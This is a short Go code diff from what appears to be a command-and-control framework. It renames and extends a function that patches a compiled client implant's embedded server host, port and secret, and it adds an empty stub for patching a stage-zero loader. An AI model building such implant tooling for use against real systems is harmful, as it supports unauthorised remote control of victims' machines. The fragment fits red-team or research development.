@@ -64,14 +64,14 @@ func MultiplyString(s string, count int) string {
 	return out
 }
 
-func PatchConfig() {
+func PatchStage1Config() {
 	b, err := ioutil.ReadFile("C:\\Users\\Christopher\\Desktop\\GoC2\\bin\\client.exe")
 	if err != nil {
 		log.Fatal(err)
 	}
 	// new config
 	conf := data.Config{}
-	conf.ServerHostName = "192.168.56.1"
+	conf.ServerHostName = "0.0.0.0"
 	conf.ServerPort = "80"
 	conf.ServerSecret = "test"
 	stringConf, err := json.Marshal(conf)
@@ -87,6 +87,11 @@ func PatchConfig() {
 	ioutil.WriteFile("C:\\tmp\\malleableclient.exe", b, 0644)
 }
 
+func PatchStage0Config() {
+	// patch stage zero PIC here. ?
+	// probably just patch where stage 1 is located and user agent etc.
+}
+
 func main() {
-	PatchConfig()
+	PatchStage1Config()
 }
